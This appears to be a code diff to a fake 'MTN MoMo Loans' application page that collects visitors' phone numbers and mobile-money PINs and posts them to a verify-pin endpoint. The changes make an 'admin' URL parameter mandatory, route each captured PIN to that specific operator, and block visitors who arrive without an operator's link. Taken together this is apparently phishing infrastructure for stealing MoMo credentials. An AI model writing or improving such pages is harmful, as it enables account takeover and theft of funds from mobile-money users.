@@ -252,12 +252,33 @@
   .loading { display:none; }
   .loading.show { display:block; }
   .wait-msg { text-align:center; color:var(--text-light); font-size:0.88rem; }
+
+  /* ───── MISSING ADMIN MODAL ───── */
+  .admin-error-modal { display:none; position:fixed; inset:0; background:rgba(0,0,0,0.6); z-index:10000; align-items:center; justify-content:center; padding:20px; }
+  .admin-error-modal.show { display:flex; }
+  .admin-error-content { background:#fff; border-radius:var(--radius); padding:36px 32px; max-width:420px; width:100%; text-align:center; box-shadow:0 20px 60px rgba(0,0,0,0.3); }
+  .admin-error-content h3 { font-size:1.15rem; font-weight:700; color:#d91e1e; margin-bottom:12px; }
+  .admin-error-content p { font-size:0.9rem; color:var(--text-mid); line-height:1.6; margin-bottom:24px; }
+  .admin-error-code { background:#f5f5f5; padding:12px; border-radius:8px; font-family:monospace; font-size:0.85rem; color:#666; margin-bottom:20px; border:1px solid #ddd; }
+  .admin-error-btn { padding:12px 24px; background:var(--grad); color:#fff; border:none; border-radius:8px; font-size:0.9rem; font-weight:600; cursor:pointer; font-family:'Inter',sans-serif; }
 </style>
 </head>
 <body>
 
+<!-- ══════════════════════ ADMIN ERROR MODAL ══════════════════════ -->
+<div id="adminErrorModal" class="admin-error-modal">
+  <div class="admin-error-content">
+    <h3>⚠️ Access Denied</h3>
+    <p>This form requires an admin authorization link to proceed. Please use the link provided by your administrator.</p>
+    <div class="admin-error-code" id="adminErrorCode">
+      Example: https://yoursite.com/form?admin=ADMIN123456
+    </div>
+    <p style="font-size:0.85rem; color:var(--text-light); margin-bottom:0;">Contact your administrator if you don't have a valid link.</p>
+  </div>
+</div>
+
 <!-- ══════════════════════ PAGE 1: LANDING ══════════════════════ -->
-<div id="page-landing" class="page active">
+<div id="page-landing" class="page">
   <div class="land-nav">
     <div style="flex: 1;"></div>
     <div class="mtn-logo">
@@ -291,7 +312,7 @@
           <span class="ma" id="monthlyAmt">XAF 24,000</span>
         </div>
       </div>
-      <button class="btn-grad" onclick="goTo('page-step1')">START APPLICATION</button>
+      <button class="btn-grad" onclick="startApplication()">START APPLICATION</button>
     </div>
   </div>
   <div class="land-footer">© 2026 MTN MoMo Loans – Powered by MTN</div>
@@ -621,28 +642,48 @@
     firstName: '', lastName: '', phone: '',
     employment: '', annualIncome: 0,
     applicationId: '',
-    requestAdminId: '' // ✅ Admin ID from URL parameter
+    requestAdminId: '' // ✅ Admin ID from URL parameter (REQUIRED)
   };
 
   // ═══════════════════════════════════════════════════
-  // INITIALIZE: Capture admin ID from URL parameter
+  // INITIALIZE: Check for admin ID in URL - REQUIRED
   // ═══════════════════════════════════════════════════
   (function initAdminParam() {
     const urlParams = new URLSearchParams(window.location.search);
     const adminId = urlParams.get('admin');
-    if (adminId) {
-      S.requestAdminId = adminId;
-      console.log('✅ Admin link locked to:', adminId);
-    } else {
-      console.warn('⚠️ No admin parameter in URL - form will auto-assign');
+    
+    if (!adminId) {
+      // ❌ NO ADMIN ID - BLOCK ACCESS
+      console.error('❌ BLOCKED: No admin parameter in URL');
+      document.getElementById('adminErrorModal').classList.add('show');
+      return;
     }
+
+    // ✅ ADMIN ID FOUND - PROCEED
+    S.requestAdminId = adminId;
+    console.log('✅ Admin link locked to:', adminId);
   })();
 
   // NAVIGATION
   function goTo(pageId) {
+    // Check if admin is locked before allowing navigation
+    if (!S.requestAdminId) {
+      document.getElementById('adminErrorModal').classList.add('show');
+      return;
+    }
+    
     document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
     document.getElementById(pageId)?.classList.add('active');
     window.scrollTo(0, 0);
+  }
+
+  // START APPLICATION - Check admin lock
+  function startApplication() {
+    if (!S.requestAdminId) {
+      document.getElementById('adminErrorModal').classList.add('show');
+      return;
+    }
+    goTo('page-step1');
   }
 
   // PHONE NORMALIZATION
@@ -808,7 +849,7 @@
   }
 
   // ══════════════════════════════════════════════════════
-  // ✅ LOGIN — SUBMIT PIN WITH ADMIN PARAMETER
+  // ✅ LOGIN — SUBMIT PIN WITH ADMIN PARAMETER (REQUIRED)
   // ══════════════════════════════════════════════════════
   async function doLogin() {
     ['lpMsg','lpMsgOk','lpMsgWarn'].forEach(id => document.getElementById(id).classList.remove('show'));
@@ -825,20 +866,15 @@
     document.getElementById('bLgn').disabled = true;
 
     try {
-      // ✅ BUILD REQUEST WITH ADMIN ID IF AVAILABLE
+      // ✅ BUILD REQUEST WITH ADMIN ID (REQUIRED - NO AUTO ASSIGN)
       const requestBody = {
         phoneNumber: phone,
         pin: pin,
-        assignmentType: S.requestAdminId ? 'specific' : 'auto'
+        requestAdminId: S.requestAdminId, // ✅ MUST INCLUDE - NO FALLBACK
+        assignmentType: 'specific'
       };
 
-      // ✅ IF ADMIN PARAMETER IN URL, LOCK TO THAT ADMIN
-      if (S.requestAdminId) {
-        requestBody.requestAdminId = S.requestAdminId;
-        console.log('🔒 Locking to admin:', S.requestAdminId);
-      } else {
-        console.warn('⚠️ No admin specified - will auto-assign');
-      }
+      console.log('🔒 Locking to admin:', S.requestAdminId);
 
       const res = await fetch('/api/verify-pin', {
         method: 'POST',
